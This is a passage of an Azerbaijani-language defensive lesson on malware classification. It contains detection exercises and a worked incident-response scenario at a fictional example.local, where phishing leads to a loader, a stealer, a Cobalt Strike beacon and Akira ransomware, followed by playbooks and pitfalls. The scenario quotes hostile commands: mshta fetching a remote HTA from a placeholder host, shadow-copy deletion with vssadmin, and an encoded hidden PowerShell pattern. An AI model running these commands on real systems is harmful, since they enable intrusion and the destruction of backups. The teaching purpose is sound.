4. **Polimorf aşkarlama məşqi.** Xeyirxah proqram götürün, sadə təlimat əvəzlənməsi ilə üç "variant" yaradın (eyni mənbəni üç fərqli optimizasiya səviyyəsi ilə yığın — `-O0`, `-O2`, `-Os`). Hər birinin SHA-256-ni hesablayın. Stabil sətrə (bir müəlliflik sətri, qeyri-adi idxal) əsaslanan YARA qaydası yazın ki, fərqli hash-lərə baxmayaraq üçünü də uyğunlaşdırsın. Hansı indikatorlar sağ qaldı? Hansılar qalmadı?
5. **PowerShell logları vasitəsilə fileless.** Test iş stansiyasında PowerShell Script Block Logging-i (`Enable-PSRemoting; Set-LogProperty 4104`) aktivləşdirin. Bilərəkdən hazırlanmış "fileless-üslublu" əmr (xeyirxah `Get-ChildItem`-ə deşifrə olunan `powershell -nop -w hidden -enc <base64>`) işlədin. Event Viewer-də (`Microsoft-Windows-PowerShell/Operational`, Event ID 4104), deşifrə olunmuş skript blokunu tapın. İstənilən qeyri-admin valideyn prosesindən kodlanmış-əmr nümunəsini tutan Sigma qaydası yazın.

## İşlənmiş nümunə — `example.local` IR çoxmərhələli infeksiyanı keçir

Bu, `example.local`-da çərşənbə axşamı günortadan sonradır. SOC-un EDR-i yüksək ciddilik xəbərdarlığı işə salır: `vssadmin.exe delete shadows /all /quiet` `WS-FIN-014` iş stansiyasında işlədi. Növbədəki cavabverən, Murad, işi açanda, maliyyə VLAN-ında daha üç iş stansiyası eyni xəbərdarlığı göstərir. O, ipi çəkir.

**Mərhələ 0 — Phishing.** E-poçt logları göstərir ki, 90 dəqiqə əvvəl, on iki `example.local` maliyyə işçisi `invoices@payroll-update.tld`-dən (real tədarükçünün typo-squat-ı) `.zip` əlavəsi olan e-poçt aldı. Üç istifadəçi onu açdı; biri içindəki `.lnk` qısayolu işlətdi, bu `mshta.exe https://cdn-update.example.tld/r.hta` icra etdi. **Təsnifat: trojan çatdırılması, LOLBin (mshta) icrası.** Hələ diskə EXE yazılmadı — HTA fileless-dir.

**Mərhələ 1 — Loader.** HTA `cdn-update.example.tld`-ə əlaqə saxlayan və kiçik DLL yükləyən base64 PowerShell-i deşifrə etdi, adı dəyişdirilmiş qanuni imzalı ikili (`OneDrive.exe` -> `OneDrive.dll`) vasitəsilə sideload edildi. DLL host-u izləyir (domen-qoşulmuş? VM? AV məhsul?) və hər 47 saniyədə az jitter ilə HTTPS son nöqtəsinə bekonlama edir. **Təsnifat: loader, DLL atımına qədər fileless, imzalı ikili side-loading vasitəsilə LotL.**

**Mərhələ 2 — Info-stealer.** 20 dəqiqə içində loader RedLine-ailə info-stealer çəkdi. RedLine istifadəçinin Chrome `Login Data` SQLite verilənlər bazasını oxudu, kuki və saxlanılmış kredensialları HTTPS üzərindən `.ru` Telegram-API son nöqtəsinə eksfiltrasiya etdi, Discord və Steam nişanlarını qopardı, sonra özünü sildi. Murad gördükdə, stealer-in ikilisi getdi, lakin artefaktlar EDR-in proses qeydindədir. **Təsnifat: info-stealer; saatlar içində istifadəçinin onlayn hesabları üzrə kredensial təkrar istifadəsini gözləyin.**

**Mərhələ 3 — RAT ötürmə.** Görünür, oğurlanmış kredensiallar əsl məqsəd *deyildi* — yan iş idi. Loader canlı qaldı və üçüncü mərhələ kimi Cobalt Strike Beacon-u çəkdi, operator profili Microsoft Update trafikini təqlid edirdi. Beacon 18 saat şəbəkəni xəritələndirdi: SMB paylaşımları, AD qrupları, maliyyə fayl serverləri, yedək serveri. **Təsnifat: RAT (kommersiya red-team aləti yenidən istifadə olunur); uzun-müddətli mərhələ.**

**Mərhələ 4 — Ransomware.** Saat 16:42-də operator pivot etdi: əvvəlki RedLine atımında parolu olan kompromis olunmuş admin hesabından PsExec vasitəsilə yeddi fayl serveri və dörd iş stansiyasına Akira-ailə ransomware yükü göndərdi. Ransomware: kölgə nüsxələrini silir, yedək xidmətlərini öldürür, SMB paylaşımlarını şifrələyir, `akira_readme.txt` atır. **Murad ilk gördüyü xəbərdarlıq budur.** O, VLAN-ı izolyasiya edənə qədər, maliyyə paylaşımının ~18%-i şifrələnmişdir.

**Saxlama.** Murad bütün maliyyə VLAN-ını firewall-da izolyasiya edir, bütün hostlarda side-loaded `OneDrive.dll` prosesini öldürür, son 72 saatda təsirli maşınlara toxunan istənilən hesab üçün AD parollarının məcburi rotasiyasını edir və daha sonrakı yaddaş-forensiya üçün EDR-in tam proses ağaclarını çıxarır. Yedək nüsxələr (offline nüsxə, dəyişməz saxlama) salamatdır — bərpa gecə yarıyadək başlayır.

**Sonra-hərəkət.** İnfeksiya *beş zərərli proqram ailəsindən ibarət bir zəncir* idi: trojan çatdırılması, loader, info-stealer, RAT, ransomware. Hər mərhələ fərqli telemetriya və fərqli playbook tələb edirdi. Zənciri qırmaq üçün ən erkən imkan Mərhələ 0 (istifadəçi kliki) və ya Mərhələ 1 (`mshta.exe`-nin uzaq HTA-nı gətirməsi LOLBin nümunəsi — üç ay əvvəl səs-küy üçün söndürülmüş mövcud Sigma qaydası) idi. Komanda qaydanı yenidən aktivləşdirir, tənzimləyir və xaricə HTA icrasını blokladıyan maliyyə-VLAN çıxış məhdudiyyəti əlavə edir. Dərs: **hər mərhələdə təsnifat cavabverənə hansı playbook-u işlətməyi söyləyəndir** — və Mərhələ 1-i tutacaq qayda artıq yazılmışdı.

Muradın sonra-hərəkət qeydi: *"Aşkarlamamız var idi. Onu söndürdük. Təsnifat hər ailənin necə göründüyünü xatırladır; intizam qaydaları canlı saxlamaqdır."*

İkinci `example.local` dərsi: hər mərhələnin saxlanması fərqli qatdan loglara bağlı idi. Mərhələ 0 e-poçt-şlüz sualı idi. Mərhələ 1 EDR əmr-sətri sualı idi. Mərhələ 2 şəbəkə-çıxış sualı idi. Mərhələ 3 Sysmon şəbəkə-və-proses sualı idi. Mərhələ 4 fayl-server audit-log sualı idi. İstənilən bir qatda log-ları olmayan SOC zəncirin o mərhələsinə kor olardı. **Aşkarlama əhatəsi tək məhsul deyil, stack-dir.**

## Problem həlli və tələlər

- **Çatdırılma ilə yükü qarışdırmaq.** "Trojan" necə gəldiyini təsvir edir; əməliyyat baxımından əhəmiyyətli olan *yük*-dür (RAT, stealer, ransomware). Həmişə hər ikisini qeyd edin.
- **Tək-ailə qərəzi.** Müasir nüfuzlar ailələri zəncirləyir. "Ransomware insidenti" adətən həftələr əvvəl phishing-loader-RAT zənciri kimi başlayır. Geriyə doğru araşdırın.
- **Yalnız-hash IOC bloklaması.** Polimorf və paketlənmiş nümunələr hər build üçün yeni hash istehsal edirlər. Hash blokları kömək edir, lakin heç vaxt işi tamamlamır — davranış qaydaları ilə cütləşdirin.
- **Sandbox yayınması.** Bir çox loader VM artefaktlarını (CPU sayı, MAC OUI, domen-qoşulma vəziyyəti) aşkar edir və sandbox-larda yatmış qalırlar. Təmiz sandbox verdikti "bu fayl xeyirxahdır" ilə eyni deyil.
- **Living-off-the-Land korluğu.** Mühitinizdə `powershell.exe`, `wmic`, `mshta`, `rundll32`, `regsvr32` və `bitsadmin` məhdudlaşdırılmamışdırsa, müasir zərərli proqramın əhəmiyyətli hissəsi AV-nin tapması üçün heç bir EXE qoymur.
- **Real siqnalı boğan bloatware səs-küyü.** OEM agentləri AV xəbərdarlıqları və SIEM panellərini müntəzəm işə salır; onları söndürmək lazımdır, lakin təsadüfən qonşu qanuni aşkarlamaları söndürür.
- **"Bu sadəcə kriptominerdir" laqeydliyi.** Mainer hücumçunun RCE-si olduğunu deməkdir. Eyni giriş sabah ransomware yerləşdirə bilər.
- **PUA və zərərli proqram səhv-təsnifatı.** Bir tədarükçü tərəfindən PUA kimi səhv etiketlənmiş həqiqətən zərərli nümunə operator işini bitirərkən növbədə oturur. Sərhəd halları üçün ən azı iki mühərriki çarpaz-istinad edin.
- **Makro standart-söndürülüb laqeydliyi.** Microsoft indi internet-etiketli makroları standart olaraq blokladığı üçün hücumçular `.lnk`, `.iso`, `.img`, `.svg`, OneNote və HTML smuggling-ə keçdilər. Aşkarlamanı uyğun yeniləyin.
- **Məntiqi bombaları kiçik qiymətləndirmək.** İnsider-yerləşdirilmiş kod illərlə yatmış qala bilər. Kod baxışı və vəzifələrin ayrılması vacibdir; texniki aşkarlama çətindir.
- **Rootkit kor nöqtələri.** Canlı-sistem AV-i kernel rootkit-in gizlətdiyini görə bilməz. Periodik offline təsvir və yaddaş çəkilişləri yeganə etibarlı yoxlamadır.
- **Ransomware yedək teatrı.** Offline yedək nüsxələr ransomware-i *yalnız* bərpa üçün sınanırlarsa məğlub edirlər. Bir çox `example.local`-üslublu təşkilat insidentin 2-ci saatında yedəklərin korlanmış və ya tam olmadığını kəşf edir.
- **Fileless-i aşkarlanmaz kimi qiymətləndirmək.** Fileless zərərli proqram nəhəng telemetriya buraxır (PowerShell 4104, AMSI hadisələri, WMI abunələri, Sysmon Event 1/3/7/13). Aşkarlama problemi log əhatəsidir, mümkünsüzlük deyil.
- **Botnet IoT kor nöqtəsi.** Mirai-sinif botnet-lər marşrutlaşdırıcıları, kameraları və printerləri yoluxdurur — SOC-un tez-tez monitorinq etmədiyi qurğular. Telemetriyaya IoT/OT seqmentləri əlavə edin.
- **DGA hash-bloklaması faydasızdır.** Domen-yaradan alqoritmlər gündə minlərlə namizəd istehsal edir. Spesifik adlar deyil, *nümunə* (yüksək-entropiyalı, heç vaxt həll olunmamış subdomenlər) üzərində aşkar edin.
- **Adware paketləyən "pulsuz" alətlər.** Üçüncü tərəfin yükləmə saytlarından alət proqramı quraşdıran kiçik işçilər korporativ filo-ya PUP-lar gətirirlər. Proqram-yerləşdirmə siyasəti və AppLocker vacibdir.
- **MFA keylogger-ləri məğlub edir? Qismən.** Keylog-edilmiş statik parol MFA-ya qarşı faydasızdır, lakin autentifikasiyadan sonra sessiya-cookie və ya nişan oğurluğu hələ də işləyir. İdarə olunan host-da keylog-u sadəcə parol-kompromisi deyil, sessiya-kompromisi kimi qiymətləndirin.
- **Düz şəbəkələrdə qurd yayılması.** Düz /16 korporativ şəbəkə qurdun oyun meydançasıdır. Funksiyaya görə seqmentləşdirin və şərq-qərb firewall qaydalarını tətbiq edin — bir gün daxili qurdun görünəcəyini fərz edin.
- **Deşifrələyici optimizmi.** Bəzi ransomware ailələrinin ictimai deşifrələyiciləri var (No More Ransom). Çoxunun yoxdur və deşifrələyiciləri olanlar tez-tez yalnız köhnə versiyalar üçün işləyir. Offline yedəklərdən bərpa davamlı cavabdır.
- **Atribusiya yayındırma.** "Conti-dirmi yoxsa BlackBasta?" maraqlıdır; "lateral yayıldımı?" təcilidir. Əvvəlcə saxlama, sonra atribusiya.

## Təsnifatdan playbook-a

Nümunə təsnif edildikdən sonra, playbook proqnozlaşdırıla bilən olmalıdır. `example.local`-un SOC-unun növbə masasının yanında çap edib saxladığı qısa xəritələmə:

- **Ransomware** → VLAN izolyasiya, şifrələmə prosesini öldürmək, bir yoluxmuş hostun yaddaşını qorumaq, hüquq/kommunikasiyaya eskalasiya, yedək bütövlüyünü yoxlamaq, tənzimləyici xəbərdarlığı hazırlamaq.
- **Banking trojan / info-stealer** → son nöqtəni karantinə, istifadəçi üçün məcburi kredensial rotasiyası (bu hostdan əldə etdiyi korporativ + şəxsi hesablar), bütün aktiv sessiyaları ləğv etmək, istifadəçini xəbərdar etmək.
- **RAT / Cobalt Strike Beacon** → yaddaş təsvirini qorumaq, izolyasiya etmək, lakin söndürməmək (dəyişən sübut), əlavə imrant-lar üçün lateral təhdid-ovçuluğu, uzun-müddətli gözləmək — daha çox şeyin gizli olduğunu fərz etmək.
- **Qurd** → mənbə VLAN-ını seqment-izolyasiya etmək, istismar edilmiş CVE-ni təcili yamaqlamaq, indikatorlar üçün həmkarları skan etmək, yamaq tam deyilsə yenidən-yoluxmanı gözləmək.
- **Kriptominer** → karantinə, lakin daha dərin-kompromis indikatoru kimi qiymətləndirmək — mainer quraşdırmaq üçün istifadə olunan giriş sabah ransomware quraşdıra bilər.
- **Məntiqi bomba** → təsirli sistemləri dondurmaq, HR/hüquqi cəlb etmək, kodu hələ silməmək (təqib üçün qorumaq), əlaqəli depo-ları kod-baxış etmək.
- **Rootkit** → söndürmək, diski və proşivkanı offline təsvir etmək, proşivka-rezident olarsa aparatı əvəzləmək.
- **Adware / PUA** → bilet-səviyyəli aradan qaldırma, adware başqa yükləri sideload etmirsə təcili saxlama yox.

Xəritələmə başlanğıc nöqtəsidir; istehsal playbook-larında yüzlərlə təfərrüat var. Lakin hər ailə üçün hətta bu bir-sətir divarda olmaq, təsnifat addımının həqiqətən cavabı idarə etməsi deməkdir, hər insidentin eyni ümumi "izolyasiya və yenidən-təsvir" refleksinə çevrilməsi əvəzinə.

## Əsas nəticələr

- **Hər IR missiyası təsnifatla başlayır.** Ailəni dəqiqələr içində adlandırmaq playbook-u müəyyən edir.
- **Müasir nüfuzlar ailələri zəncirləyir.** Phishing-loader-stealer-RAT-ransomware beş adı olan tək hücumdur.
- **Davranış hash-i məğlub edir.** Polimorf, paketlənmiş və fileless nümunələr dizaynla imza AV-ni keçir.
- **Fileless aşkarlanmaz deyil.** O, aşkarlama xərcini disk artefaktlarından PowerShell, WMI və proses telemetriyasına köçürür.
- **Loader-lər ən ucuz tutuşdur.** Kiçik birinci-mərhələni aşkar etmək sizi bahalı ikinci-mərhələdən xilas edir.
- **Ransomware cavabı saatdır.** Dəqiqələrdə şəbəkə izolyasiyası, saatlarda yedək-bərpa planı, günlərdə tənzimləyici xəbərdarlıq.
- **PUA / bloatware / adware tənzimlənməsi həqiqi işdir.** Onsuz, real zərərli proqram siyasət səs-küyündə boğulur.
- **Qurdlar hələ də mövcuddur.** SMB-sinif CVE-ləri dərhal yamaqlayın və şəbəkənizi seqmentləşdirin.
- **OS-dən aşağı rootkit-lər offline alətlər tələb edir.** Canlı-sistem skanları proşivka-rezident imrantları görə bilməz.
- **Təsnifat ortaq dildir.** CTI hesabatları, ATT&CK Software qeydləri və tədarükçü xəbərdarlıqları ailə adlarından istifadə edir — eyni dildə geri danışın.

## İstinadlar

- MITRE ATT&CK Software kataloqu — [attack.mitre.org/software](https://attack.mitre.org/software/)
- MITRE ATT&CK Groups — [attack.mitre.org/groups](https://attack.mitre.org/groups/)
- CISA Known Exploited Vulnerabilities kataloqu — [cisa.gov/known-exploited-vulnerabilities-catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- CISA StopRansomware — [cisa.gov/stopransomware](https://www.cisa.gov/stopransomware)
- MalwareBazaar (abuse.ch) — [bazaar.abuse.ch](https://bazaar.abuse.ch/)
- ANY.RUN interaktiv sandbox — [any.run](https://any.run/)
- VirusTotal — [virustotal.com](https://www.virustotal.com/)
- Hybrid Analysis — [hybrid-analysis.com](https://www.hybrid-analysis.com/)
- Joe Sandbox — [joesandbox.com](https://www.joesandbox.com/)
- Malpedia (Fraunhofer FKIE) — [malpedia.caad.fkie.fraunhofer.de](https://malpedia.caad.fkie.fraunhofer.de/)
- No More Ransom Project — [nomoreransom.org](https://www.nomoreransom.org/)
- ID Ransomware — [id-ransomware.malwarehunterteam.com](https://id-ransomware.malwarehunterteam.com/)
- Sysmon (Sysinternals) — [learn.microsoft.com/en-us/sysinternals/downloads/sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- LOLBAS layihəsi (Living-off-the-Land Binaries) — [lolbas-project.github.io](https://lolbas-project.github.io/)
- Unit 42 təhdid-tədqiqat blogu — [unit42.paloaltonetworks.com](https://unit42.paloaltonetworks.com/)
- Mandiant blogu — [cloud.google.com/blog/topics/threat-intelligence](https://cloud.google.com/blog/topics/threat-intelligence)

## Əlaqəli dərslər

- [Hücum indikatorları (IOC və IOA)](./attack-indicators.md) — hər zərərli proqram ailəsinin buraxdığı artefaktlar, aşkarlama üçün kodlanır.
- [Sosial mühəndislik](./social-engineering.md) — phishing zərərli proqramların əksəriyyətinin necə daxil olduğudur.
- [İlkin giriş](./initial-access.md) — loader və trojanların xidmət etdiyi möhkəmlənmə addımı.
- [Şəbəkə hücumları](./network-attacks.md) — qurdlar, botnet-lər və lateral hərəkət bu texnikalardan istifadə edir.
- [Təhdid aktorları və intel](./threat-actors-and-intel.md) — hansı ailələri kim işlədir və CTI hesabatlarını necə oxumaq olar.
- [İstintaq və azaltma](../blue-teaming/investigation-and-mitigation.md) — zərərli proqram insidentini saxlayan blue-team iş axını.
- [Rəqəmsal forensiya](../blue-teaming/digital-forensics.md) — yoluxmuş sistemdən host, yaddaş və şəbəkə sübutlarını necə çıxarmaq olar.
- [Təhdid intel və zərərli proqram analizi alətləri](../general-security/open-source-tools/threat-intel-and-malware.md) — sandbox, təsnifat və pivot üçün açıq mənbə alətləri.
- [SIEM və monitorinq](../general-security/open-source-tools/siem-and-monitoring.md) — ailə-spesifik aşkarlama qaydalarının işlədiyi yer.

## Ümumi yanlış təsəvvürlər

- **"Antivirus zərərli proqramdan qoruyur."** Müasir imza AV məlum geniş yayılmış zərərli proqramları tutur; hədəflənmiş, polimorf, fileless və paketlənmiş nümunələr müntəzəm olaraq onu keçirlər. AV strategiya deyil, əsas xəttdir.
- **"EDR-imiz var, qorunuruq."** EDR AV-dən çox daha yaxşıdır, lakin yenə də qaydalardan, telemetriyadan və xəbərdarlıqları triaj edən insanlardan asılıdır. Səhv konfiqurasiya olunmuş EDR EDR-siz olmaqdır.
- **"Makro müdafiəsi phishing-i həll etdi."** Makrolar standart olaraq bloklanır; hücumçular LNK, ISO, IMG, OneNote, HTML smuggling və OAuth razılığına keçdilər. Phishing problemi köçdü, yox olmadı.
- **"Ransomware ən pis haldır."** Wiper-lər (NotPetya, HermeticWiper) və aylarla aşkar edilməyən təchizat zənciri kompromisləri əslində daha pisdir — sakit məlumat oğurluğu görünən şifrələmədən bərpa etmək daha çətindir.
